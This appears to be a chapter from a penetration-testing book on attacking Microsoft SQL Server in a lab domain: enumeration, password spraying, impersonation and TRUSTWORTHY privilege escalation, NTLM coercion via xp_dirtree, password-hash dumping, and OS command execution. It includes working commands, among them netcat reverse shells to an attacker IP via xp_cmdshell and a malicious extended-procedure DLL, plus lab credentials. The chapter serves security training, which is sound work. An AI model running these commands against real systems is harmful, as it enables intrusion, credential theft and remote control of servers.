<html><head></head><body>
<div id="sbo-rt-content"><div id="_idContainer280">
<h1 class="chapter-number" id="_idParaDest-175"><a id="_idTextAnchor191"/>9</h1>
<h1 id="_idParaDest-176"><a id="_idTextAnchor192"/>Compromising Microsoft SQL Server</h1>
<p>This chapter will focus on a common and vital service of a typical Windows-based environment – Microsoft SQL Server. SQL Server is a relational database management system, similar to Oracle or MySQL. It is tightly integrated into Active Directory, allowing Windows authentication, the use of trust relationships, and much more. We will go through the usual attack steps, starting with the discovery and enumeration of instances in a target environment. A few different tools can help with these activities. Then, we will explore the ways to escalate privileges within SQL Server and then move on to run commands on the underlying operating system. This chapter will provide you with a solid understanding of lateral movement between database instances by abusing database links. Lastly, we will look at the ways to achieve persistence at the host and application levels utilizing what is available in SQL <span class="No-Break">Server functionality.</span></p>
<p>In this chapter, we will cover the <span class="No-Break">following topics:</span></p>
<ul>
<li>Introduction, discovery, <span class="No-Break">and enumeration</span></li>
<li><span class="No-Break">Privilege escalation</span></li>
<li><strong class="bold">Operating system</strong> (<strong class="bold">OS</strong>) <span class="No-Break">command execution</span></li>
<li><span class="No-Break">Lateral movement</span></li>
<li><span class="No-Break">Persistence</span></li>
</ul>
<h1 id="_idParaDest-177"><a id="_idTextAnchor193"/>Technical requirements</h1>
<p>In this chapter, you will need to have access to <span class="No-Break">the following:</span></p>
<ul>
<li>VMware Workstation Pro or Oracle VirtualBox with at least 16 GB of RAM, 8 CPU cores, and at least 55 GB of total space (more if you <span class="No-Break">take snapshots)</span></li>
<li>A Linux-based operating system is <span class="No-Break">strongly recommended</span></li>
<li>From the GOADv2 project, we will use SRV02 <span class="No-Break">and SRV03</span></li>
</ul>
<h1 id="_idParaDest-178"><a id="_idTextAnchor194"/>Introduction, discovery, and enumeration</h1>
<p>In this section, we will start our journey in Microsoft SQL Server security assessment. We will briefly introduce you to SQL Server and then move on to the discovery process. A significant amount of the section will be a deep dive into the manual and automated aspects of the <span class="No-Break">enumeration process.</span></p>
<h2 id="_idParaDest-179"><a id="_idTextAnchor195"/>SQL Server introduction</h2>
<p>Before we jump into the discovery topic, let’s start by looking at SQL Server<a id="_idIndexMarker855"/> functionality, fixed server roles, and security mechanisms. SQL Server is an application installed on the OS; in our case, we will focus only on Windows hosts. The server runs as a set of uniquely named Windows services in the context of the service account. The default listening TCP port is <strong class="source-inline">1433</strong>, and the UDP port is <strong class="source-inline">1434</strong>; however, if more services are running, the list of ports will be longer[1]. In order to get access to stored data, a user must pass authentication and <span class="No-Break">authorization checks.</span></p>
<p>Authentication<a id="_idIndexMarker856"/> verifies whether a user has enough permissions to log in to an instance. There are two authentication mechanisms – using either a Windows account or SQL Server login. The difference between these two mechanisms is in who handles the authentication – the domain controller or SQL Server itself. After login, an account will be assigned certain server-level roles, as defined during its creation. Think of these roles as Active Directory security groups. These roles are server-wide and can be fixed or user-defined. SQL Server 2022 has added 10 new fixed roles[2] to the existing 9 from previous versions[3]. Fixed server role permissions can’t be changed, except for the “public” role. Authorization<a id="_idIndexMarker857"/> happens at a database level and determines what a user’s permissions on a database after logging in are. For this purpose, authentication accounts are mapped to <span class="No-Break">database users.</span></p>
<p>There are five <span class="No-Break">default databases:</span></p>
<ul>
<li><strong class="source-inline">master</strong> – stores <a id="_idIndexMarker858"/>system-level <span class="No-Break">instance information</span></li>
<li><strong class="source-inline">msdb</strong> – required <a id="_idIndexMarker859"/>by SQL Server Agent to schedule jobs <span class="No-Break">and alerts</span></li>
<li><strong class="source-inline">model</strong> – a <a id="_idIndexMarker860"/>template database, used to create <span class="No-Break">new databases</span></li>
<li><strong class="source-inline">resource</strong> – a <a id="_idIndexMarker861"/>read-only database that keeps <strong class="source-inline">sys</strong> <span class="No-Break">schema objects</span></li>
<li><strong class="source-inline">tempdb</strong> – stores <a id="_idIndexMarker862"/>temporary objects <span class="No-Break">and results</span></li>
</ul>
<p>Now that we have the basic information about SQL Server, we can now move on to <span class="No-Break">reconnaissance activities.</span></p>
<h2 id="_idParaDest-180"><a id="_idTextAnchor196"/>Discovery</h2>
<p>From an unauthenticated <a id="_idIndexMarker863"/>attacker perspective, to discover SQL Server, we need to perform a network port scan. Nmap, <strong class="source-inline">PowerUpSQL</strong>, <strong class="source-inline">SQLCMD</strong>, CrackMapExec, and the <strong class="source-inline">mssql_ping</strong> Metasploit module will assist in this activity. These tools query common ports, such as TCP <strong class="source-inline">1433</strong> and UDP <strong class="source-inline">1434</strong>, or pull and parse SPNs from a domain, such as <span class="No-Break">the following:</span></p>
<pre class="console">
crackmapexec mssql 192.168.56.22-23</pre> <p>If an adversary has local access to the database server, simple service enumeration for the name starting with <strong class="source-inline">MSSQL*</strong> or querying the registry hive located in <strong class="source-inline">HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\*</strong> will reveal running database instances. PowerUpSQL does exactly the same with the <span class="No-Break"><strong class="source-inline">Get-SQLInstanceLocal</strong></span><span class="No-Break"> function.</span></p>
<p>A set of valid domain credentials will allow an attacker to perform forest-wide SPN scanning to detect running SQL Server instances. Throughout the chapter, examples will be shown with a recently released tool called <strong class="bold">SQLRecon</strong>[4] and good old <strong class="bold">PowerUpSQL</strong>[5]. Let us discover whether SQL Server is installed on the essos domain by executing three different commands that provide exactly the same result. It’s important to mention that <strong class="source-inline">setspn</strong> and SQLRecon use a current domain user context and run from a domain-joined computer. For a Python script from <strong class="source-inline">impacket</strong>, we can explicitly specify credentials while running it <span class="No-Break">from Kali:</span></p>
<pre class="console">
setspn -T essos -Q MSSQL*/*
python3 GetUserSPNs.py essos.local/khal.drogo:horse
SQLRecon.exe /e:SqlSpns</pre> <p>SQLRecon performs an LDAP query, looking for a user (<strong class="source-inline">sAMAccountType=805306368</strong>) with an SPN starting with <strong class="source-inline">MSSQL*</strong> (<strong class="source-inline">servicePrincipalName=MSSQL*</strong>). The result of the discovery is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer256">
<img alt="Figure 9.1 – Discovered SQL Server instances" height="596" src="image/B18964_09_01.jpg" width="857"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.1 – Discovered SQL Server instances</p>
<p>An adversary can <a id="_idIndexMarker864"/>then try to log into the discovered instances using compromised domain or SQL Server user credentials. Another way to get an initial foothold in the SQL Server is to brute-force your <span class="No-Break">way in.</span></p>
<h2 id="_idParaDest-181"><a id="_idTextAnchor197"/>Brute force</h2>
<p>Dictionary attacks <a id="_idIndexMarker865"/>are <a id="_idIndexMarker866"/>noisy and must be executed with caution to avoid being locked out of target accounts. Nmap scripts, Metasploit modules, and PowerUpSQL functions can assist in such an activity. In PowerUpSQL[6], there are <a id="_idIndexMarker867"/>three functions that allow you to perform <span class="No-Break">login attacks:</span></p>
<ul>
<li><strong class="source-inline">Invoke-SQLAuditWeakLoginPw</strong> – testing a username <span class="No-Break">as password</span></li>
<li><strong class="source-inline">Get-SQLConnectionTestThreaded</strong> – logging in with a known username/password pair or as a <span class="No-Break">current user</span></li>
<li><strong class="source-inline">Get-SQLServerLoginDefaultPw</strong> – checking<a id="_idIndexMarker868"/> for default passwords used by common applications, based on an <span class="No-Break">instance name</span></li>
</ul>
<p><strong class="source-inline">CrackMapExec</strong> also <a id="_idIndexMarker869"/>allows to you perform a password spray attack, using supplied username and <span class="No-Break">password lists:</span></p>
<pre class="console">
crackmapexec mssql 192.168.56.23 -u userfile -p passwordfile --no-bruteforce</pre> <p>Let’s assume that an adversary has compromised or guessed the password of the user <strong class="source-inline">jorah.mormont</strong>. The following PowerUpSQL chained commands verify access to SQL Server instances as <strong class="source-inline">jorah.mormont</strong> and collect <span class="No-Break">server information:</span></p>
<pre class="console">
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Get-SQLServerInfo</pre> <p>The output of the preceding <a id="_idIndexMarker870"/>command is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer257">
<img alt="Figure 9.2 – SQL Server enumeration using PowerUpSQL" height="550" src="image/B18964_09_02.jpg" width="1036"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.2 – SQL Server enumeration using PowerUpSQL</p>
<p>The <strong class="source-inline">SQLRecon</strong> command shows mapped role<a id="_idTextAnchor198"/>s <span class="No-Break">as well:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer258">
<img alt="Figure 9.3 – An initial foothold with a compromised user" height="653" src="image/B18964_09_03.jpg" width="1371"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.3 – An initial foothold with a compromised user</p>
<p>After obtaining a <a id="_idIndexMarker871"/>foothold, an adversary can continue enumeration of other database users to identify a possible next target. There is a Metasploit module to enumerate SQL logins, called <strong class="source-inline">admin/mssql/mssql_enum_sql_logins</strong>, and PowerUpSQL has a <strong class="source-inline">Get-SQLFuzzServerLogin</strong> function. This function under the hood invokes the SQL Server <strong class="source-inline">suser_name</strong> function and iterates the principal ID value. A public role is enough to perform such <span class="No-Break">an activity:</span></p>
<pre class="console">
Get-SQLFuzzServerLogin -Instance BRAAVOS\SQLEXPRESS -Verbose</pre> <p>The result is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer259">
<img alt="Figure 9.4 – All server logins for the instance" height="1059" src="image/B18964_09_04.jpg" width="931"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.4 – All server logins for the instance</p>
<p>It is also possible to enumerate domain<a id="_idIndexMarker872"/> users with the <strong class="source-inline">Get-SQLFuzzDomainAccount</strong> function and Metasploit <strong class="source-inline">admin/mssql/mssql_enum_domain_accounts</strong> module. The idea is exactly the same, but this time, iteration goes over domain RIDs. The default end iteration value is 1,000; however, it can be modified for large environments with the <strong class="source-inline">-EndId</strong> option. It’s important to note that the LSA SID lookup requests (in our case, <strong class="source-inline">lsa_lookupsids3</strong>) that are utilized by this function will cause a lot of traffic for the domain controller in a short period <span class="No-Break">of time:</span></p>
<pre class="console">
Get-SQLFuzzDomainAccount -Instance BRAAVOS\SQLEXPRESS -EndId 2000</pre> <p>The result <a id="_idIndexMarker873"/>of the <strong class="source-inline">Get-SQLFuzzDomainAccount</strong> command is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer260">
<img alt="Figure 9.5 – All domain groups and users" height="943" src="image/B18964_09_05.jpg" width="947"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.5 – All domain groups and users</p>
<p>The <a id="_idIndexMarker874"/>brute-force attack will leave traces in the Windows log with the event ID <strong class="source-inline">18456</strong>. The error text from the event helps to determine whether the attacker performed user enumeration or a <span class="No-Break">password spray.</span></p>
<p>The next step for the attacker is to enumerate the database itself using <span class="No-Break">acquired credentials.</span></p>
<h2 id="_idParaDest-182"><a id="_idTextAnchor199"/>Database enumeration</h2>
<p>Enumeration can be done <a id="_idIndexMarker875"/>with the help of tools such as SQLRecon<a id="_idIndexMarker876"/> or manually running queries, with a tool such as <strong class="bold">HeidiSQL</strong>[7] or<a id="_idIndexMarker877"/> Microsoft SQL Server Management Studio. Here is a set of common queries to get basic information about the database[8][9]. You can run these queries in SQL SMS. The comments above the statements in the following screenshot aim to explain <span class="No-Break">their purpose:</span></p>
<pre class="console">
-- database version
SELECT @@version;
-- current login name
SELECT SYSTEM_USER;
-- current role
SELECT USER;
-- check if our role has public or sysadmin privileges
SELECT IS_SRVROLEMEMBER('public');
SELECT IS_SRVROLEMEMBER('sysadmin');
-- list all databases
SELECT name FROM master..sysdatabases;
-- list all users
SELECT * FROM sys.server_principals
-- list linked servers
EXEC sp_linkedservers;
-- list logins available for impersonation
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
-- effective permissions for the server and the database
SELECT * FROM fn_my_permissions(NULL, 'SERVER')
SELECT * FROM fn_my_permissions(NULL, 'DATABASE')</pre> <p>All the information from the <a id="_idIndexMarker878"/>preceding queries is significant; however, the most crucial information is the current user’s role, the linked servers, the logins available for impersonation, and our effective permissions on the server <span class="No-Break">and database.</span></p>
<p>SQLRecon has correspondent modules for enumeration. The tool supports five types of authentication, but we are only interested in three of them – a Windows token (<strong class="source-inline">WinToken</strong>), Windows Domain Credentials (<strong class="source-inline">WinDomain</strong>), and Local Credentials (<strong class="source-inline">Local</strong>). Let <span class="No-Break">us enumerate.</span></p>
<p>For example, the following commands show the linked servers and accounts that can be impersonated by the current <span class="No-Break">user (</span><span class="No-Break"><strong class="source-inline">khal.drogo</strong></span><span class="No-Break">):</span></p>
<div>
<div class="IMG---Figure" id="_idContainer261">
<img alt="Figure 9.6 – A list of the accounts that can be impersonated and the linked servers" height="268" src="image/B18964_09_06.jpg" width="899"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.6 – A list of the accounts that can be impersonated and the linked servers</p>
<p>To identify privilege escalation vectors, we can run PowerUpSQL functions such as <strong class="source-inline">Invoke-SQLAudit</strong> or <strong class="source-inline">Invoke-SQLEscalatePriv</strong>. However, let us cover the privilege escalation techniques available one by one in more detail in the <span class="No-Break">following section.</span></p>
<h1 id="_idParaDest-183"><a id="_idTextAnchor200"/>Privilege escalation</h1>
<p>In the previous section, we saw a<a id="_idIndexMarker879"/> number of techniques for database enumeration. In this section, we will use gathered reconnaissance results for the user <strong class="source-inline">khal.drogo</strong> to identify privilege escalation paths on the database server. We will also practice escalating privileges from SQL Server to the host itself. At the end of this section, we will escalate to the <strong class="source-inline">sysadmin</strong> role from the user, with host local <span class="No-Break">administrator privileges.</span></p>
<h2 id="_idParaDest-184"><a id="_idTextAnchor201"/>Impersonation</h2>
<p>One of the most common privilege<a id="_idIndexMarker880"/> escalation <a id="_idIndexMarker881"/>vectors is user impersonation. This privilege allows the impersonation of another user or login in order to access resources on behalf of the impersonated user, without specifically granting rights[10]. <strong class="source-inline">sysadmin</strong> has this permission for all databases, members of the <strong class="source-inline">db_owner</strong> role only have this permission in databases they own. We can check whether a current user is allowed to impersonate <strong class="source-inline">sa</strong> user login with the <span class="No-Break">following query:</span></p>
<pre class="console">
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')</pre> <p>Impersonation can happen on the server level (<strong class="source-inline">EXECUTE AS LOGIN</strong>) and on the database level (<strong class="source-inline">EXECUTE AS USER</strong>). Metasploit has a module named <strong class="source-inline">admin/mssql/mssql_escalate_execute_as</strong> that can be used to escalate privileges via impersonation. PowerUpSQL also has a function to identify an impersonation and <span class="No-Break">exploit it:</span></p>
<pre class="console">
Invoke-SQLAuditPrivImpersonateLogin -Instance BRAAVOS\SQLEXPRESS -Exploit</pre> <p>The result is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer262">
<img alt="Figure 9.7 – Successful privilege escalation" height="795" src="image/B18964_09_07.jpg" width="1146"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.7 – Successful privilege escalation</p>
<p>Clearly, it is vital<a id="_idIndexMarker882"/> to audit users with the impersonation privilege. The <strong class="source-inline">Invoke-SQLAudit</strong> function from PowerUpSQL lists all logins that can impersonate<a id="_idIndexMarker883"/> others. However, it cannot build a relationship graph, like BloodHound, and identify <span class="No-Break">nested ones.</span></p>
<h2 id="_idParaDest-185"><a id="_idTextAnchor202"/>TRUSTWORTHY misconfiguration</h2>
<p><strong class="source-inline">TRUSTWORTHY</strong> is a <a id="_idIndexMarker884"/>database property that <a id="_idIndexMarker885"/>indicates that SQL Server trusts a database and its content. By default, this property is disabled and only can be enabled by <strong class="source-inline">sysadmin</strong>. If an adversary is a member of the <strong class="source-inline">db_owner</strong> role on a <strong class="source-inline">TRUSTWORTHY</strong> database that is owned by <strong class="source-inline">sysadmin</strong>, it is possible to elevate privileges. The attacker with the <strong class="source-inline">db_owner</strong> role can create a stored procedure so that it will be executed in the context of the database owner – <strong class="source-inline">sysadmin</strong> (<strong class="source-inline">EXECUTE </strong><span class="No-Break"><strong class="source-inline">AS OWNER</strong></span><span class="No-Break">)[11].</span></p>
<p>Let’s set up this <a id="_idIndexMarker886"/>attack in our lab. The following code will create a <a id="_idIndexMarker887"/>database, set it as <strong class="source-inline">TRUSTWORTHY</strong>, create a login for <strong class="source-inline">viserys.targaryen</strong>, and grant him the <span class="No-Break"><strong class="source-inline">db_owner</strong></span><span class="No-Break"> role:</span></p>
<pre class="console">
CREATE DATABASE MyDb
USE MyDb
ALTER DATABASE MyDb SET TRUSTWORTHY ON
CREATE LOGIN [ESSOS\viserys.targaryen] FROM WINDOWS
ALTER LOGIN [ESSOS\viserys.targaryen] with default_database = [MyDb];
CREATE USER [ESSOS\viserys.targaryen] FROM LOGIN [ESSOS\viserys.targaryen];
EXEC sp_addrolemember [db_owner], [ESSOS\viserys.targaryen]</pre> <p>Now, we are ready to perform the attack. Firstly, let us identify <strong class="source-inline">TRUSTWORTHY</strong> databases. PowerUpSQL has a function, <strong class="source-inline">Invoke-SQLAuditPrivTrustworthy</strong>, for this task, or we can just run the following <span class="No-Break">SQL query:</span></p>
<pre class="console">
SELECT name as database_name , SUSER_NAME(owner_sid) AS database_owner , is_trustworthy_on AS TRUSTWORTHY from sys.databases;</pre> <p>Secondly, we need to check the members of the <strong class="source-inline">db_owner</strong> role within a <span class="No-Break"><strong class="source-inline">TRUSTWORTHY</strong></span><span class="No-Break"> database:</span></p>
<pre class="console">
USE MyDb;
SELECT DP1.name AS DatabaseRoleName, isnull (DP2.name, 'No members') AS DatabaseUserName FROM sys.database_role_members AS DRM  RIGHT OUTER JOIN sys.database_principals AS DP1  ON DRM.role_principal_id = DP1.principal_id  LEFT OUTER JOIN sys.database_principals AS DP2  ON DRM.member_principal_id = DP2.principal_id  WHERE DP1.type = 'R' ORDER BY DP1.name;</pre> <p>The last step is to create a procedure and <span class="No-Break">execute it:</span></p>
<pre class="console">
CREATE PROCEDURE sp_pe_trust
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember [ESSOS\viserys.targaryen],[sysadmin]
EXEC sp_pe_trust
SELECT is_srvrolemember('sysadmin')</pre> <p>An attack can be automated by using the Metasploit <strong class="source-inline">auxiliary/admin/mssql/mssql_escalate_dbowner</strong> module or the <strong class="source-inline">Invoke-SqlServer-Escalate-DbOwner</strong> script[12]. The result of the automated exploitation is shown <a id="_idIndexMarker888"/>in the<a id="_idIndexMarker889"/> <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer263">
<img alt="Figure 9.8 – Privilege escalation from db_owner to sysadmin" height="243" src="image/B18964_09_08.jpg" width="1006"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.8 – Privilege escalation from db_owner to sysadmin</p>
<p>To prevent misconfiguration, it is recommended to either switch off the <strong class="source-inline">TRUSTWORTHY</strong> property or change the database owner to a <span class="No-Break">low-privileged user.</span></p>
<p>Starting from the following section, we will gradually move from the database level to the operating <span class="No-Break">system level.</span></p>
<h2 id="_idParaDest-186"><a id="_idTextAnchor203"/>UNC path injection</h2>
<p><strong class="bold">Uniform Naming Convention</strong> (<strong class="bold">UNC</strong>) paths can be used to access files on a remote server. There are two <a id="_idIndexMarker890"/>stored procedures that support <a id="_idIndexMarker891"/>UNC paths and can be executed with a public server role – <strong class="source-inline">xp_dirtree</strong> and <strong class="source-inline">xp_fileexist</strong>. A stored procedure is a logical unit that groups several SQL statements. The benefits of this are security, reusability, and performance. By executing one of these two procedures, the attacker forces the SQL Server service account to access and subsequently authenticate to a controlled resource. Then, the NTLMv2 challenge will be captured and relayed, or cracked by an adversary. The attack can be automated by using the Metasploit <strong class="source-inline">auxiliary/admin/mssql/mssql_ntlm_stealer</strong> module, the SQLRecon <strong class="source-inline">smb</strong> module, or the <strong class="source-inline">Invoke-SQLUncPathInjection</strong> function from PowerUpSQL. All of them essentially execute the <span class="No-Break">following query:</span></p>
<pre class="console">
EXEC master.dbo.xp_dirtree '\\192.168.56.100\blah'</pre> <p>The NTLMv2<a id="_idIndexMarker892"/> challenge will be captured by<a id="_idIndexMarker893"/> Responder, as shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer264">
<img alt="Figure 9.9 – The NTLMv2 challenge for sql_svc has been captured" height="216" src="image/B18964_09_09.jpg" width="1583"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.9 – The NTLMv2 challenge for sql_svc has been captured</p>
<p>To eliminate this attack vector, it is recommended to revoke the execution of these procedures from a <span class="No-Break">public role.</span></p>
<p>There is another way to coerce authentication but, this time, as a machine account where SQL Server is installed[13]. After logging in to SQL Server Management Studio, an adversary restores a database from an XMLA file but points it to a controlled listener as a backup file location. Then, an adversary will capture the <span class="No-Break">NTLMv2 challenge.</span></p>
<h2 id="_idParaDest-187"><a id="_idTextAnchor204"/>From a service account to SYSTEM</h2>
<p>Usually, a database service<a id="_idIndexMarker894"/> account has the <strong class="source-inline">SeImpersonatePrivilege</strong> permission. Abusing this permission allows us to elevate our privilege to SYSTEM. Depending on the version of the target operating system, various exploits are available. <strong class="bold">JuicyPotato</strong>[14] works for versions below Windows Server 2019, whereas RoguePotato, PrintSpoofer, SharpEfsPotato, and GodPotato[15] work for versions above as well. All exploits use various services during exploitation, but the main idea is to create a pipe, force a connection to it, and then impersonate the SYSTEM token. To execute further commands under the context of the service, we will run the following command in HeidiSQL, which will connect back to our Kali machine as <span class="No-Break">user </span><span class="No-Break"><strong class="source-inline">sql_svc</strong></span><span class="No-Break">:</span></p>
<pre class="console">
EXEC master..xp_cmdshell 'cmd.exe /c C:\Users\Public\nc.exe -e cmd 192.168.56.100 443'</pre> <p>Simply running the <a id="_idIndexMarker895"/>exploit grants us <span class="No-Break">SYSTEM-level privileges:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer265">
<img alt="Figure 9.10 – The GodPotato exploit worked successfully" height="1414" src="image/B18964_09_10.jpg" width="1054"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.10 – The GodPotato exploit worked successfully</p>
<p>Microsoft has <a id="_idIndexMarker896"/>not released a fix for this privilege <span class="No-Break">escalation vector.</span></p>
<p>The following example will show how to obtain <strong class="source-inline">sysadmin</strong> privileges at the database level if an attacker is a <span class="No-Break">local administrator.</span></p>
<h2 id="_idParaDest-188"><a id="_idTextAnchor205"/>From a local administrator to sysadmin</h2>
<p>Another possible<a id="_idIndexMarker897"/> situation is that an adversary has obtained a local administrator’s privileges on the database server. There are known ways how to get database <strong class="source-inline">sysadmin</strong> privileges as a next step[16]. One of the most common techniques is to impersonate a SQL Server service account because, by default, it has <strong class="source-inline">sysadmin</strong> privileges. PowerUpSQL has two impersonation functions called <strong class="source-inline">Invoke-SQLImpersonateService</strong> and <strong class="source-inline">Invoke-SQLImpersonateServiceCmd</strong>. Other techniques include reading LSA secrets with the help of Mimikatz, pulling SQL Server login password hashes, injecting DLL or shellcode into a process, or even running a database in single-user mode. A Metasploit module called <strong class="source-inline">post/windows/manage/mssql_local_auth_bypass</strong> combines getting <strong class="source-inline">LocalSystem</strong> privileges for an older SQL Server installation and migrating to a service process for a <span class="No-Break">newer installations.</span></p>
<p>Running the following commands allows you to obtain <strong class="source-inline">sysadmin</strong> privileges and dump SQL Server login <span class="No-Break">password hashes:</span></p>
<pre class="console">
Invoke-SQLImpersonateService -Verbose -Instance BRAAVOS\SQLEXPRESS
Get-SQLServerPasswordHash -Verbose -Instance BRAAVOS\SQLEXPRESS</pre> <p>The result is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer266">
<img alt="Figure 9.11 – SQL Server login password hashes" height="1066" src="image/B18964_09_11.jpg" width="920"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.11 – SQL Server login password hashes</p>
<p>Apparently, there is <a id="_idIndexMarker898"/>another way to dump password hashes – by extracting them from a <strong class="source-inline">master.mdf</strong> file. XPN published a while ago some great research[17] that showed the internals of the <strong class="source-inline">master.mdf</strong> file and released the tool to extract password hashes[18]. This attack requires local administrator privileges. Firstly, we need to locate the <strong class="source-inline">master.mdf</strong> file and copy it using the RawCopy tool. This tool copies raw data from disk, so getting locked out of the <strong class="source-inline">master.mdf</strong> file by SQL Server will be bypassed. The PowerShell script uses <strong class="source-inline">OrcaMDF</strong> .NET libraries, so we need to load them too, and then dump <span class="No-Break">the hashes:</span></p>
<pre class="console">
RawCopy64.exe /FileNamePath:"C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\master.mdf" /OutputPath:C:\Users\Public
[Reflection.Assembly]::LoadFile("$pwd\OrcaMDF.RawCore.dll")
[Reflection.Assembly]::LoadFile("$pwd\OrcaMDF.Framework.dll")
ipmo .\Get-MDFHashes.ps1
Get-MDFHashes -mdf "C:\Users\Public\master.mdf" | fl</pre> <p>The output<a id="_idIndexMarker899"/> of the preceding commands is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer267">
<img alt="Figure 9.12 – The password hash of the SA SQL Server login" height="82" src="image/B18964_09_12.jpg" width="1371"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.12 – The password hash of the SA SQL Server login</p>
<p>In the following section, we will examine multiple ways to run commands at the <span class="No-Break">OS level.</span></p>
<h1 id="_idParaDest-189"><a id="_idTextAnchor206"/>OS command execution</h1>
<p>In the upcoming sections, we<a id="_idIndexMarker900"/> will look at ways to execute OS system commands through SQL Server. To enable command execution, <strong class="source-inline">sysadmin</strong> privileges are required. Execution itself always happens in the context of a service account. An attacker does not need to know the hash or password of the SQL Server service or agent account. Let’s start by looking at built-in extended <span class="No-Break">stored procedures.</span></p>
<h2 id="_idParaDest-190"><a id="_idTextAnchor207"/>xp_cmdshell</h2>
<p><strong class="source-inline">xp_cmdshell</strong> is<a id="_idIndexMarker901"/> probably<a id="_idIndexMarker902"/> the most well-known built-in extended stored procedure, which is disabled by default. Enabling it requires <strong class="source-inline">sysadmin</strong> privileges. There are a few functions in PowerUpSQL (<strong class="source-inline">Invoke-SQLOSCmdExec</strong> and <strong class="source-inline">Invoke-SQLOSCmd</strong>), SQLRecon (<strong class="source-inline">EnableXp</strong> and <strong class="source-inline">XpCmd</strong>), as well as the Metasploit <strong class="source-inline">admin/mssql/mssql_exec</strong> module that can automate this task. The manual query to install <strong class="source-inline">xp_cmdshell</strong> and enable it is <span class="No-Break">shown here:</span></p>
<pre class="console">
sp_addextendedproc 'xp_cmdshell','xplog70.dll
EXEC sp_configure 'show advanced options',1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE
EXEC master..xp_cmdshell 'whoami'</pre> <p>It’s important to<a id="_idIndexMarker903"/> mention that such an activity will create events with the ID <strong class="source-inline">15457</strong>, as <a id="_idIndexMarker904"/>the <strong class="source-inline">sp_configure</strong> procedure will have been used. The Windows event ID <strong class="source-inline">15281</strong> will be logged if the configuration attempt fails because the user does not have <span class="No-Break">enough privileges.</span></p>
<div>
<div class="IMG---Figure" id="_idContainer268">
<img alt="Figure 9.13 – A failed attempt to reconfigure xp_cmdshell" height="288" src="image/B18964_09_13.jpg" width="819"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.13 – A failed attempt to reconfigure xp_cmdshell</p>
<p>Also, there is a module in Metasploit (<strong class="source-inline">exploit/windows/mssql/mssql_payload</strong>) that will allow the execution of an arbitrary payload <span class="No-Break">via </span><span class="No-Break"><strong class="source-inline">xp_cmdshell</strong></span><span class="No-Break">.</span></p>
<h2 id="_idParaDest-191"><a id="_idTextAnchor208"/>A custom extended stored procedure</h2>
<p>Simply put, a custom <a id="_idIndexMarker905"/>extended stored procedure<a id="_idIndexMarker906"/> is an extension to SQL Server in the form of DLL. Sysadmin privileges are required to register each procedure inside the extension. A code sample for DLL can be found on GitHub[19]. It’s important to note that DLL and function names are case-sensitive and must be exactly <span class="No-Break">the same.</span></p>
<p>PowerUpSQL has a function called <strong class="source-inline">Create-SQLFileXpDll</strong> that will create a DLL for us. Then, we will register it, list the extended stored procedures to verify registration, and finally, execute our malicious extended procedure. The following commands replicate <span class="No-Break">the process:</span></p>
<pre class="console">
Create-SQLFileXpDll -OutFile C:\Users\Public\xp_shell.dll -Command "C:\Users\Public\nc.exe -e cmd 192.168.56.100 443" -ExportName xp_shell -Verbose
Get-SQLQuery -Instance BRAAVOS\SQLEXPRESS -Username sa -Password "sa_P@ssw0rd!Ess0s" -Query "sp_addextendedproc 'xp_shell', 'C:\Users\Public\xp_shell.dll'"
Get-SQLStoredProcedureXP -Instance BRAAVOS\SQLEXPRESS -Username sa -Password "sa_P@ssw0rd!Ess0s"
Get-SQLQuery -Instance BRAAVOS\SQLEXPRESS -Username sa -Password "sa_P@ssw0rd!Ess0s" -Query "EXEC xp_shell"</pre> <p>Unfortunately, the <a id="_idIndexMarker907"/>automatically <a id="_idIndexMarker908"/>PowerUpSQL created DLL did not execute on the target machine in the lab, even through the <strong class="source-inline">rundll32</strong> command. Surprisingly, the same DLL works fine on a Windows 10 machine, as <span class="No-Break">shown here:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer269">
<img alt="Figure 9.14 – DLL spawned a reverse shell" height="316" src="image/B18964_09_14.jpg" width="794"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.14 – DLL spawned a reverse shell</p>
